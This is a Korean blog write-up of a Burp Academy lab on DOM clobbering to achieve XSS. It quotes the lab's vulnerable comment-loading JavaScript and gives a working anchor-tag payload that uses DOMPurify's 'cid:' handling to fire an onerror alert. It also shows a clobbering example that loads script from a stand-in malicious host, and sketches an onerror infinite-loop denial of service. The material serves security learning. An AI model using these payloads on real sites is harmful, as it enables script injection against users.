---
layout: post
title: "Burp Academy-DOM 관련 취약점: Exploiting DOM clobbering to enable XSS"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Dom 관련 취약점, XSS]
toc: true
last_modified_at: 2024-11-26 09:33:00 +0900
---

# 개요
- DOM based 타입의 XSS 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering
- 취약점 설명페이지: https://portswigger.net/web-security/dom-based/dom-clobbering
- 난이도: EXPERT (어려움)


# DOM Clobbering 이란? 
- 먼저 영단어 Clobbering 이란 마구 때리기, 두들겨 패기라는 뜻이 있다. DOM 을 두들겨 패는 테크닉이다. 
- DOM Clobbering 은 페이지에 HTML을 삽입해서 DOM을 조작하여 궁극적으로는 페이지의 Javascript의 동작을 조작하는 기술이다. 
- DOM Clobbering 은 XSS가 불가능하나 일부 HTML은 조작할 수 있는 경우, id나 name과 같은 속성이 HTML필터에 의해 화이스리스트화 되어 있는 경우 등에 쓸 수 있다. 
- 가장 흔한 것은 앵커 엘레먼트(a 태그)를 사용해서 글로벌 변수를 덮어쓰는 것이다. 이렇게 되면 어플리케이션에서 안전하지 못하게 이 변수를 사용하는 경우, 예를 들면 동적으로 script URL을 생성하는 경우에 취약해질 수 있다. 
- 클로버링이(두들겨 패기)라는 용어는 객체의 전역 변수나 속성을 "두드려 패고" 대신 DOM 노드나 HTML 컬렉션으로 덮어쓴다는 사실에서 유래했다. 예를 들어, DOM 객체를 사용하여 다른 JavaScript 객체를 덮어쓰고, `submit`과 같은 안전하지 않은 이름을 악용하여 submit폼의 `submit()` 함수를 방해할 수 있다.  

# 어떻게 DOM Clobbering 취약점을 악용하는가?
Javascript 개발자가 흔히 사용하는 다음과 같은 패턴이 있다:

```js
var someObject = window.someObject || {};
```

이는 DOM객체 someObject가 존재하면 그 것을 사용하고, 존재하지 않으면 빈 오브젝트를 생성하는 코드이다. 

만약 페이지의 일부 HTML을 컨트롤할 수 있다면, DOM node의 `someObject` 를 앵커를 사용해서 두들겨 팰 수 있다. 예를들어 웹 사이트에 다음과 같은 코드가 있다고 하자. 

```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

위의 코드를 exploit 하려면, 다음과 같은 HTML을 삽입하여 앵커 엘레먼트로 `someObject`의 참조를 두들겨 팰 수 있다. 


```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

설명
- 두 개의 앵커가 동일한 ID를 사용하고 있기 때문에, DOM은 이들을 DOM 컬렉션으로 그룹핑한다.
- 그 후에 DOM Clobbering 벡터는 DOM 컬렉션의 `someObject`의 참조를 덮어쓴다. 
- 두 번째의 앵커에는 `name`속성이 사용되어 있다. 이는 `someObject`의 `url`속성을 두들겨 패기 위함이다. 덮여쓰여지는 `url`속성은 외부 사이트의 스크립트를 가리키고 있다. 

# 문제 개요
- 이 랩에는 DOM-clobbering 취약점이 있다. 
- 댓글 기능은 "안전한" HTML을 허용한다. 
- 랩을 풀려면, HTML 삽입을 통해 변수를 클로버링하여, XSS를 수행하여 alert함수가 실행되도록 하라. 
- 주의: 랩에서 의도한 해결책은 Chrome에서만 동작한다.

```
This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.

Note
Please note that the intended solution to this lab will only work in Chrome.
```

# 풀이
1. 랩을 살펴보고 취약한 부분을 찾는다. 블로그의 포스트 글을 보면 답글 남기는 폼이 있다. HTML은 허용된다고 적혀있다. 

![](/images/burp-academy-dom-based-6-1.png)

2. 여기에 글을 남겨본다. 글 본문에 `<a href="/">Link test</a>`를 적어서 저장해봤다. 

![](/images/burp-academy-dom-based-6-3.png)

3. 정상처리된 것을 알 수 있다. 

![](/images/burp-academy-dom-based-6-2.png)

4. 블로그 웹 페이지를 살펴보면 다음과 같은 코드가 있는 것을 알 수 있다. loadComments 자바스크립트 함수를 호출하고 있다. 

```html
<span id='user-comments'>
<script src='/resources/js/domPurify-2.0.15.js'></script>
<script src='/resources/js/loadCommentsWithDomClobbering.js'></script>
<script>loadComments('/post/comment')</script>
</span>
```

5. loadCommentsWithDomClobbering.js 파일을 살펴보면 `loadComments` 함수가 있다. 이 함수는 `displayComments` 함수를 호출한다. 

```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(data) {
        return data.replace(/[<>'"]/g, function(c){
            return '&#' + c.charCodeAt(0) + ';';
        })
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
            let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

            let divImgContainer = document.createElement("div");
            divImgContainer.innerHTML = avatarImgHTML

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(divImgContainer);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};


```

6. `displayComments` 함수를 보면 취약한 코드가 보인다. 이 부분이다. 

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

먼저 윗줄의 코드를 본다. 


```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```
- 이 코드는 윈도우에 defaultAvatar 라는 DOM 객체가 있으면 그 것을 사용하고, 아니면 디폴트 아바타의 svg경로를 포함하는 새로운 객체를 생성하는 코드다. 
- 객체 defaultAvatar는 논리 OR연산자와 전역 변수가 결합된 위험한 패턴을 사용하여 구현되었다. 이로 인해 DOM 클로버링에 취약해진다.

7. 이어서 아래줄의 코드를 보자. defaultAvatar의 avatar속성을 사용해서 img태그를 생성하고 있다.  defaultAvatar의 avatar속성에 악의적인 페이로드를 삽입하면 XSS가 가능할 것 같다. 

```js
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

8. exploit 코드를 만든다. 다음과 같다. 

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

- 앵커 태그를 사용하여 defaultAvatar 오브젝트를 클로버링한다. 두 개의 동일한 ID를 가지는 앵커태그를 사용해 DOM 컬렉션안에서 그룹핑되도록 만든다. 
- 두 번째 앵커의 `name` 속성은 값 `"avatar"`를 가지고 있다. 이는 href 값으로 avatar 속성의 값을 덮어쓴다. 
- 이 사이트는 DOM 관련 취약점을 방어하기 위해 DOMPurify 라이브러리를 사용하고 있다. 
- DOMPurify 는 `cid:`프로토콜을 허용한다. 이 프로토콜은 쌍따옴표를 URL 인코딩하지 않는다. 이는 실행시점(런타임)에 디코딩되는 인코딩된 더플쿼트를 삽입할 수 있다는 뜻이다. (익스플로잇 코드에서 `&quot;` 가 HTML인코딩된 쌍따옴표이다.)
- 결과적으로 위의 코드는 페이지가 다음에 로드될 때 defaultAvatar변수에 다음의 변조된(클로버링된) 속성이 할당되도록 한다. 

```json
{avatar: 'cid:"onerror=alert(1)//'}
```

- 두 번째 게시물을 작성하면 브라우저는 새로 삽입된 전역 변수 defaultAvatar가 존재하므로 그 것을 사용한다. 
- exploit 코드가 살행되면 avatarImgHTML은 다음과 같이 생겼을 것이다. 쌍따옴표가 삽입되어서 onerror 부분이 살아났다. src에 있는 값이 소스를 얻어올 수 없는 값이므로 에러 이벤트가 발생하여 alert함수가 실행된다. 

```html
<img class="avatar" src="'cid:"onerror=alert(1)//'">
```


9. 블로그에 exploit코드를 입력하고 저장한다. 

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

그리고 두번째로 댓글에 아무 글이나 적어서 저장한다. 그러고 나서 블로그 페이지를 다시 로드하면 여기서부터는 alert함수가 동작한다! 

![](/images/burp-academy-dom-based-6-4.png)


랩이 풀렸다. 

![](/images/burp-academy-dom-based-6-success.png)


# 번외. 무한루프 Dos?
img 태그의 onerror 이벤트를 악용해서 무한루프에 빠지게 할 수 도 있을 것 같다. 다음과 같은 식으로 onerror 의 핸들러에도 존재하지 않는 이미지의 경로를 지정하면 onerror 이벤트와 핸들러가 무한히 반복될 것이다. 나중에 한번 테스트해보자. 

```html
<img src="aaa.domain.com/bbb.jpg" onError=this.src="aaa.domain.com/ccc.png">
```

크롬에도 2010년에 보고된 내용이다. 이때는 고치지 않는 것으로 결론이 났던 것 같다. 

참고: 
- https://short-developer.tistory.com/15
- 크롬에 보고된 이슈: https://issues.chromium.org/issues/40466048